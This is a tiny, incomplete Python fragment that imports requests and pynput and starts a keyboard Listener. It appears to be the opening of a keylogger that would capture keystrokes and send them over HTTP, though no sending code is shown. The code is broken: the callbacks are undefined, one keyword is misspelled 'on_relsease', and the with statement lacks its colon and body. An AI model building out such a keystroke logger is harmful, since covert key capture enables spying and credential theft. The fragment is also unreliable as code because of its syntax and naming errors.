import requests
import pynput

from pynput.keyboard import Key, Listener

with Listener(on_press=on_press, on_relsease=on_release)